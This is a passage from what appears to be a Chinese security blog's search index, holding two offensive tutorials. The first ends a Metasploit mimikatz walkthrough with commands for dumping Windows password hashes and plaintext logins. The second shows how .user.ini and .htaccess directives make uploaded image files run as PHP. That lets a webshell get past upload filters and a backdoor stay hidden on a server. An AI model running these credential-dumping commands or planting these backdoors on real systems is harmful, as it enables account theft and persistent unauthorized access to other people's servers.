href="#获取登录密码的hash值" class="headerlink" title="获取登录密码的hash值"></a>获取登录密码的hash值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msv</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/3-2.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/3-2.png" alt="img"></a></p><p>上面已经是得到hash值了. 下面算明文密码.</p><h3 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos</span><br></pre></td></tr></table></figure><p>look…拿到登录的明文密码了.</p><h2 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h2><h3 id="使用另一种方式获取哈希值"><a href="#使用另一种方式获取哈希值" class="headerlink" title="使用另一种方式获取哈希值"></a>使用另一种方式获取哈希值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/5-1.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/5-1.png" alt="img"></a></p><h3 id="根据上面的方式获取明文密码"><a href="#根据上面的方式获取明文密码" class="headerlink" title="根据上面的方式获取明文密码"></a>根据上面的方式获取明文密码</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/6-1.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/6-1.png" alt="img"></a></p><h2 id="第三种方法："><a href="#第三种方法：" class="headerlink" title="第三种方法："></a>第三种方法：</h2><h3 id="Wdigest命令"><a href="#Wdigest命令" class="headerlink" title="Wdigest命令"></a>Wdigest命令</h3><p>这个命令呢, 没有上面的复杂,加载模块后直接调用这个wdigest.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wdigest</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/7-1.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/7-1.png" alt="img"></a></p><h2 id="第四种方法："><a href="#第四种方法：" class="headerlink" title="第四种方法："></a>第四种方法：</h2><h3 id="tspkg命令"><a href="#tspkg命令" class="headerlink" title="tspkg命令"></a>tspkg命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tspkg</span><br></pre></td></tr></table></figure><p><a href="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/8-1.png"><img src="https://blog.qianxiao996.cn/wp-content/uploads/2019/09/8-1.png" alt="img"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一、</span><br><span class="line">load mimikatz #加载mimikatz</span><br><span class="line">msv #获取hash值</span><br><span class="line">kerberos #获取明文</span><br><span class="line"></span><br><span class="line">二、</span><br><span class="line">load mimikatz #加载mimikatz</span><br><span class="line">wdigest #获取系统账户信息</span><br><span class="line"></span><br><span class="line">三、</span><br><span class="line">load mimikatz #加载mimikatz</span><br><span class="line">tspkg #获取系统账户信息</span><br><span class="line"></span><br><span class="line">四、</span><br><span class="line">load mimikatz #加载mimikatz</span><br><span class="line">mimikatz_command -f samdump::hashes</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><!-- rebuild by neat -->]]></content>
      <categories>
        <category>渗透技巧</category>
      </categories>
      <tags>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title>.user.ini和.htaccess文件构成的PHP后门</title>
    <url>/2019/10/31/user-ini%E5%92%8C-htaccess%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8/</url>
    <content><![CDATA[<!-- build time:Sat Jul 04 2020 19:51:23 GMT+0800 (GMT+08:00) --><h1 id="0x01-user-ini"><a href="#0x01-user-ini" class="headerlink" title="0x01 .user.ini"></a>0x01 .user.ini</h1><hr><p><code>.user.ini</code>。它比<code>.htaccess</code>用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p><p>那么什么是.user.ini？</p><p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。 在此可以查看：<a href="http://php.net/manual/zh/ini.list.php" target="_blank" rel="noopener">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p><p><img src="686a269a0af575a90fba6ec1d02358b7.png" alt="enter image description here"></p><p>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a href="http://php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">这里</a>又解释了：</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p><p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p><p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p><p>Php配置项中有两个比较有意思的项（下图第一、四个）：</p><p><img src="e9a20f6cbd6533adefa34f7c8e16ee4f.png" alt="enter image description here"></p><p><code>auto_append_file</code>、<code>auto_prepend_file</code>，点开看看什么意思：</p><p><img src="015ad3339486d230a311827392943605.png" alt="enter image description here"></p><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto_prepend_file&#x3D;01.gif</span><br></pre></td></tr></table></figure><p>01.gif是要包含的文件。</p><p>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</p><p>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：</p><p><img src="a477c2190281d55624cd02a82f645ec1.png" alt="enter image description here"></p><p><img src="b8083d91efe79425a99e527b02b6947e.png" alt="enter image description here"></p><p>访问echo.php即可看到后门：</p><p><img src="76fc81e41b88e376d2bfcda578798780.png" alt="enter image description here"></p><p>Nginx下同样：</p><p><img src="ddf1aa45c037d5d2ba5dca8982289275.png" alt="enter image description here"></p><p><img src="f96b227f7e11fb1a5c0fe33b3c675be1.png" alt="enter image description here"></p><p>那么，我们可以猥琐地想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p><h1 id="0x02-htaccess文件"><a href="#0x02-htaccess文件" class="headerlink" title="0x02 .htaccess文件"></a>0x02 .htaccess文件</h1><p><img src="1457380-20180921190943294-1100922854.png" alt="img"></p><h2 id="文件上传绕过"><a href="#文件上传绕过" class="headerlink" title="文件上传绕过"></a>文件上传绕过</h2><p>一般.htaccess可以用来留后门和针对黑名单绕过</p><p>创建一个txt写入（png解析为php）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .png</span><br></pre></td></tr></table></figure><p>另存为.htaccess</p><p>上传.htaccess 必须是网站根路径</p><h2 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h2><p>可以在.htaccess 加入php解析规则</p><p>类似于把文件名包含1的解析成php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1&quot;&gt; </span><br><span class="line">SetHandler application&#x2F;x-httpd-php </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>123456.png 就会以php执行</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
      <tags>
        <tag>后门</tag>
      </tags>
  </entry>
</search>
